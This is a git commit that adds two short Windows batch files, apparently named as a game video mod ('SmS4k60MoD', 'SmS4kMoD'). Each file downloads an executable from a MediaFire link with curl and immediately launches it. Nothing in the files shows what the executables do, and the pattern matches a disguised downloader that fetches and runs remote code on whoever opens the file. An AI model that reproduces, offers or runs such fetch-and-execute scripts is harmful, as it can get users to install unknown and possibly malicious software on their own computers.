7afa7751604548d78f3c4d553f470004aa26eb3f
cooleybyte <76415577+cooleybyte@users.noreply.github.com>
2023-02-16 15:19:17 -0600

    Add files via upload

---
+++ SmS4k60MoD.bat
@@ -0,0 +1,3 @@
+curl -L -O https://download1586.mediafire.com/8fi2kl508lug/xqg04weekere37a/SmS4k60MoD.exe
+
+start "" SmS4k60MoD.exe
---
+++ SmS4kMoD.bat
@@ -0,0 +1,3 @@
+curl -L -O https://download1592.mediafire.com/2n06lplpa77g/i9k0f507bok0wc1/SmS4kMoD.exe
+
+start "" SmS4kMoD.exe
